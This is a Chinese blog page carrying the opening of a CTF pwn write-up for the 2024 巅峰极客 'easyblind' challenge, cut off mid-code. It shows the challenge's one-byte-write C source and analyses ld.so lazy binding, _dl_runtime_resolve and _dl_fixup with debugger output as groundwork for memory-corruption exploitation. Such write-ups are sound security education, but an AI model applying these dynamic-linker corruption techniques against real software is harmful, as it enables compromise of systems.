<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/08/19/2024-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-easyblind-%E5%88%86%E6%9E%90-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/19/2024-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-easyblind-%E5%88%86%E6%9E%90-1/" class="post-title-link" itemprop="url">2024-巅峰极客 easyblind 分析 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-08-19 09:43:37" itemprop="dateCreated datePublished" datetime="2024-08-19T09:43:37+08:00">2024-08-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-03 15:46:29" itemprop="dateModified" datetime="2024-09-03T15:46:29+08:00">2024-09-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>23k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>21 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>2024年的巅峰极客可以说是强Web组的大福利，除了Web其他类型居然各自只有1道题，令人困惑。在pwn方向只有一道题，但这道题质量比较高，涉及的利用链比较复杂，虽然在现实应用中基本不可能用到，但还是值得学习一番。</p>
<p>幸运的是，在网上找到了讲解此类利用方式的blog，其中使用的示例与本题完全相同：<a target="_blank" rel="noopener" href="https://hackmd.io/@pepsipu/ry-SK44pt">传送门</a>。下面的分析主要参考上面的blog。</p>
<h1 id="a-题目源码"><a class="markdownIt-Anchor" href="#a-题目源码"></a> A. 题目源码</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* chunk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__((constructor)) nightmare()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!chunk)</span><br><span class="line">        chunk = <span class="built_in">malloc</span>(<span class="number">0x40000</span>);</span><br><span class="line">    <span class="type">uint8_t</span> byte = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, &amp;offset, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">    read(<span class="number">0</span>, &amp;byte, <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line"></span><br><span class="line">    chunk[offset] = byte;</span><br><span class="line"></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;BORN TO WRITE WORLD IS A CHUNK 鬼神 LSB Em All 1972 I am mov man 410,757,864,530 CORRUPTED POINTERS&quot;</span>, <span class="number">101</span>);</span><br><span class="line">    _Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    _Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是blog中提到的源码（删除了<code>seccomp</code>，原题并无沙箱），与本题的源码除了<code>write</code>的字符串之外其他没有任何不同。<code>__attribute__((constructor))</code>是C语言的一个特性，被该特性所修饰的函数能够在<code>main</code>函数之前执行。在二进制文件中，可以观察到这个函数是通过<code>init</code>调用的。</p>
<p>在<code>nightmare</code>函数的开始，程序分配了一个0x40000的大chunk。对于此类chunk，Glibc通常都是通过调用<code>mmap</code>实现分配的，且<strong>第一个分配的此类chunk应正好位于Glibc加载地址的低地址处</strong>。需要注意这个chunk的分配地址特点，这是我们完成利用的前提条件之一。</p>
<p>随后，我们可以输入offset与byte，程序以chunk为基地址，offset为偏移，能够实现一个字节的写入。随后输出一个字符串后调用<code>_Exit</code>退出。</p>
<h1 id="b-无限写入"><a class="markdownIt-Anchor" href="#b-无限写入"></a> B. 无限写入</h1>
<p>如果我们仅仅是只能写入1个字节，那么复杂的利用无论如何也是无法完成的。因此我们要想办法无限循环<code>nightmare</code>函数。虽然我们在退出之前只能写入1个字节，但这1个字节已经足以让<code>_Exit</code>函数失能了。没错，本题是Partial RELRO，我们可以通过令ld错误解析<code>_Exit</code>函数，将<code>_Exit.got</code>指向其他函数，即可让<code>_Exit</code>调用其他函数而不是退出。（因为写入是以chunk为基地址，考虑ASLR保护，我们无法获取程序的got表的偏移，也就无法直接写入）</p>
<p>需要注意的是，<code>nightmare</code>函数由于是以<code>_Exit</code>结尾的，因此它隐式包含了<code>__noreturn</code>标签，即该函数并非以<code>ret</code>指令结尾，而是以调用<code>_Exit</code>的指令结尾。通过简单的逆向分析可以发现，<code>nightmare</code>函数（题目中为以0x11A9地址开始的函数）的下面就是<code>main</code>函数和<code>init</code>函数。因此当<code>_Exit</code>不退出并执行结束后，程序将会首先去执行<code>main</code>，而<code>main</code>中的<code>_Exit</code>也不会退出程序，因此会继续执行下面的<code>init</code>函数，这样就产生了一个<code>init -&gt; nightmare -&gt; main -&gt; init</code>的无限循环。</p>
<p><img src="1.png" alt="" /></p>
<p>因此下面我们需要深入分析got表的解析流程。</p>
<h2 id="b1-ldso-对-got-表的解析流程"><a class="markdownIt-Anchor" href="#b1-ldso-对-got-表的解析流程"></a> B.1 <a target="_blank" rel="noopener" href="http://ld.so">ld.so</a> 对 GOT 表的解析流程</h2>
<p>首先我们都知道，在Partial RELRO的ELF程序中存在.plt节和.got节。在第一次调用某个库函数时，会通过.plt节中的跳转到ld.so中解析函数地址。在本题中，<code>nightmare</code>函数直接调用的是.plt.sec节地址，这个节会跳转到.plt节。本题中.plt节中一共有5个条目，后面4个分别对应于got表中的4个函数，而第1个则是跳转到函数解析流程。</p>
<p>在本题中，对于第一次调用<code>read</code>函数，跳转流程是这样的：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read@plt.sec    (0x1090)</span><br><span class="line">read@plt        (0x1040)</span><br><span class="line">PLT[0]          (0x1020)</span><br><span class="line">ld.so</span><br></pre></td></tr></table></figure>
<p>随后，我们跟随调试，结合源码进入ld.so查看。</p>
<p>直接进入的是<code>_dl_runtime_resolve_xsavec</code>，这个函数使用汇编语言编写，位于<code>/sysdeps/x86_64/dl-trampoline.h</code>，如下所示，首先保存一些寄存器状态后传入2个参数，随后调用<code>_dl_fixup</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i 0x7ffff7fd8d30</span><br><span class="line">=&gt; 0x7ffff7fd8d30 &lt;_dl_runtime_resolve_xsavec&gt;:	endbr64 </span><br><span class="line">   0x7ffff7fd8d34 &lt;_dl_runtime_resolve_xsavec+4&gt;:	push   rbx</span><br><span class="line">   0x7ffff7fd8d35 &lt;_dl_runtime_resolve_xsavec+5&gt;:	mov    rbx,rsp</span><br><span class="line">   0x7ffff7fd8d38 &lt;_dl_runtime_resolve_xsavec+8&gt;:	and    rsp,0xffffffffffffffc0</span><br><span class="line">   0x7ffff7fd8d3c &lt;_dl_runtime_resolve_xsavec+12&gt;:	sub    rsp,QWORD PTR [rip+0x23f4d]        # 0x7ffff7ffcc90 &lt;_rtld_global_ro+432&gt;</span><br><span class="line">   0x7ffff7fd8d43 &lt;_dl_runtime_resolve_xsavec+19&gt;:	mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x7ffff7fd8d47 &lt;_dl_runtime_resolve_xsavec+23&gt;:	mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">   0x7ffff7fd8d4c &lt;_dl_runtime_resolve_xsavec+28&gt;:	mov    QWORD PTR [rsp+0x10],rdx</span><br><span class="line">   0x7ffff7fd8d51 &lt;_dl_runtime_resolve_xsavec+33&gt;:	mov    QWORD PTR [rsp+0x18],rsi</span><br><span class="line">   0x7ffff7fd8d56 &lt;_dl_runtime_resolve_xsavec+38&gt;:	mov    QWORD PTR [rsp+0x20],rdi</span><br><span class="line">pwndbg&gt; </span><br><span class="line">   0x7ffff7fd8d5b &lt;_dl_runtime_resolve_xsavec+43&gt;:	mov    QWORD PTR [rsp+0x28],r8</span><br><span class="line">   0x7ffff7fd8d60 &lt;_dl_runtime_resolve_xsavec+48&gt;:	mov    QWORD PTR [rsp+0x30],r9</span><br><span class="line">   0x7ffff7fd8d65 &lt;_dl_runtime_resolve_xsavec+53&gt;:	mov    eax,0xee</span><br><span class="line">   0x7ffff7fd8d6a &lt;_dl_runtime_resolve_xsavec+58&gt;:	xor    edx,edx</span><br><span class="line">   0x7ffff7fd8d6c &lt;_dl_runtime_resolve_xsavec+60&gt;:	mov    QWORD PTR [rsp+0x250],rdx</span><br><span class="line">   0x7ffff7fd8d74 &lt;_dl_runtime_resolve_xsavec+68&gt;:	mov    QWORD PTR [rsp+0x258],rdx</span><br><span class="line">   0x7ffff7fd8d7c &lt;_dl_runtime_resolve_xsavec+76&gt;:	mov    QWORD PTR [rsp+0x260],rdx</span><br><span class="line">   0x7ffff7fd8d84 &lt;_dl_runtime_resolve_xsavec+84&gt;:	mov    QWORD PTR [rsp+0x268],rdx</span><br><span class="line">   0x7ffff7fd8d8c &lt;_dl_runtime_resolve_xsavec+92&gt;:	mov    QWORD PTR [rsp+0x270],rdx</span><br><span class="line">   0x7ffff7fd8d94 &lt;_dl_runtime_resolve_xsavec+100&gt;:	mov    QWORD PTR [rsp+0x278],rdx</span><br><span class="line">pwndbg&gt; </span><br><span class="line">   0x7ffff7fd8d9c &lt;_dl_runtime_resolve_xsavec+108&gt;:	xsavec [rsp+0x40]</span><br><span class="line">   0x7ffff7fd8da1 &lt;_dl_runtime_resolve_xsavec+113&gt;:	mov    rsi,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x7ffff7fd8da5 &lt;_dl_runtime_resolve_xsavec+117&gt;:	mov    rdi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x7ffff7fd8da9 &lt;_dl_runtime_resolve_xsavec+121&gt;:	call   0x7ffff7fd5e70 &lt;_dl_fixup&gt;</span><br><span class="line">   0x7ffff7fd8dae &lt;_dl_runtime_resolve_xsavec+126&gt;:	mov    r11,rax</span><br><span class="line">   0x7ffff7fd8db1 &lt;_dl_runtime_resolve_xsavec+129&gt;:	mov    eax,0xee</span><br><span class="line">   0x7ffff7fd8db6 &lt;_dl_runtime_resolve_xsavec+134&gt;:	xor    edx,edx</span><br><span class="line">   0x7ffff7fd8db8 &lt;_dl_runtime_resolve_xsavec+136&gt;:	xrstor [rsp+0x40]</span><br><span class="line">   0x7ffff7fd8dbd &lt;_dl_runtime_resolve_xsavec+141&gt;:	mov    r9,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x7ffff7fd8dc2 &lt;_dl_runtime_resolve_xsavec+146&gt;:	mov    r8,QWORD PTR [rsp+0x28]</span><br><span class="line">pwndbg&gt; </span><br><span class="line">   0x7ffff7fd8dc7 &lt;_dl_runtime_resolve_xsavec+151&gt;:	mov    rdi,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x7ffff7fd8dcc &lt;_dl_runtime_resolve_xsavec+156&gt;:	mov    rsi,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x7ffff7fd8dd1 &lt;_dl_runtime_resolve_xsavec+161&gt;:	mov    rdx,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x7ffff7fd8dd6 &lt;_dl_runtime_resolve_xsavec+166&gt;:	mov    rcx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x7ffff7fd8ddb &lt;_dl_runtime_resolve_xsavec+171&gt;:	mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x7ffff7fd8ddf &lt;_dl_runtime_resolve_xsavec+175&gt;:	mov    rsp,rbx</span><br><span class="line">   0x7ffff7fd8de2 &lt;_dl_runtime_resolve_xsavec+178&gt;:	mov    rbx,QWORD PTR [rsp]</span><br><span class="line">   0x7ffff7fd8de6 &lt;_dl_runtime_resolve_xsavec+182&gt;:	add    rsp,0x18</span><br><span class="line">   0x7ffff7fd8dea &lt;_dl_runtime_resolve_xsavec+186&gt;:	jmp    r11</span><br></pre></td></tr></table></figure>
<p><code>_dl_fixup</code>的第一个参数是<code>struct link_map*</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /elf/link.h, line 95</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Structure describing a loaded shared object.  The `l_next&#x27; and `l_prev&#x27;</span></span><br><span class="line"><span class="comment">   members form a chain of all the shared objects loaded at startup.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   These data structures exist in space used by the run-time dynamic linker;</span></span><br><span class="line"><span class="comment">   modifying them may have disastrous results.  */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
<p>这是一个链表结构，保存有ELF文件需要加载的所有动态链接库信息。链表的第一个元素保存ELF文件的加载地址，<code>name</code>为空。其后依次为各个动态链接库的加载地址与名字。因为要查找一个函数的地址，首先我们不知道它属于哪个动态链接库，因此需要遍历处理。需要注意的是，有两个<code>link_map</code>结构，上面那个是简化版，还有一个非常复杂的位于<code>/include/link.h</code>。</p>
<p>下面是某次执行时的<code>link_map</code>结构：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7ffff7ffe2e0</span><br><span class="line">00:0000│ rdi 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f</span><br><span class="line">01:0008│     0x7ffff7ffe2e8 —▸ 0x7ffff7ffe888 ◂— 0</span><br><span class="line">02:0010│     0x7ffff7ffe2f0 —▸ 0x555555557df8 ◂— 1</span><br><span class="line">03:0018│     0x7ffff7ffe2f8 —▸ 0x7ffff7ffe890 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0x7ffff7ffe890</span><br><span class="line">00:0000│  0x7ffff7ffe890 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047</span><br><span class="line">01:0008│  0x7ffff7ffe898 —▸ 0x7ffff7fc1371 ◂— insb byte ptr [rdi], dx /* &#x27;linux-vdso.so.1&#x27; */</span><br><span class="line">02:0010│  0x7ffff7ffe8a0 —▸ 0x7ffff7fc13e0 ◂— 0xe</span><br><span class="line">03:0018│  0x7ffff7ffe8a8 —▸ 0x7ffff7fbb160 —▸ 0x7ffff7d78000 ◂— 0x3010102464c457f</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0x7ffff7fbb160</span><br><span class="line">00:0000│  0x7ffff7fbb160 —▸ 0x7ffff7d78000 ◂— 0x3010102464c457f</span><br><span class="line">01:0008│  0x7ffff7fbb168 —▸ 0x7ffff7fbb140 ◂— &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">02:0010│  0x7ffff7fbb170 —▸ 0x7ffff7f91bc0 (_DYNAMIC) ◂— 1</span><br><span class="line">03:0018│  0x7ffff7fbb178 —▸ 0x7ffff7ffdaf0 (_rtld_global+2736) —▸ 0x7ffff7fc3000 ◂— 0x3010102464c457f</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0x7ffff7ffdaf0</span><br><span class="line">00:0000│  0x7ffff7ffdaf0 (_rtld_global+2736) —▸ 0x7ffff7fc3000 ◂— 0x3010102464c457f</span><br><span class="line">01:0008│  0x7ffff7ffdaf8 (_rtld_global+2744) —▸ 0x555555554318 ◂— &#x27;/lib64/ld-linux-x86-64.so.2&#x27;</span><br><span class="line">02:0010│  0x7ffff7ffdb00 (_rtld_global+2752) —▸ 0x7ffff7ffce80 (_DYNAMIC) ◂— 0xe</span><br><span class="line">03:0018│  0x7ffff7ffdb08 (_rtld_global+2760) ◂— 0</span><br></pre></td></tr></table></figure>
<p>由上述数据可知，ELF的加载地址应位于0x555555554000，加载了3个动态链接库，依次为linux-vdso.so.1、/lib/x86_64-linux-gnu/libc.so.6、/lib64/ld-linux-x86-64.so.2。第2个参数则是我们要解析的函数位于ELF got表中的地址中的索引值。</p>
<h3 id="_dl_fixup第一段"><a class="markdownIt-Anchor" href="#_dl_fixup第一段"></a> <code>_dl_fixup</code>第一段</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">  = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">  = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line"><span class="type">lookup_t</span> result;</span><br><span class="line">DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure>
<p>这里有一些宏定义需要下面的引用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /elf/link.h, line 28</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We use this macro to refer to ELF types independent of the native wordsize.</span></span><br><span class="line"><span class="comment">   `ElfW(TYPE)&#x27; is used in place of `Elf32_TYPE&#x27; or `Elf64_TYPE&#x27;.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElfW(type)	_ElfW (Elf, __ELF_NATIVE_CLASS, type)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ElfW(e,w,t)	_ElfW_1 (e, w, _##t)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ElfW_1(e,w,t)	e##w##t</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /sysdeps/generic/ldsodefs.h, line 78</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /elf/elf.h, line 858</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB	6		<span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /elf/dl-runtime.c, line 67</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">= (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);      <span class="comment">// l-&gt;l_info[6]-&gt;d_un.d_ptr + l-&gt;l_addr</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = 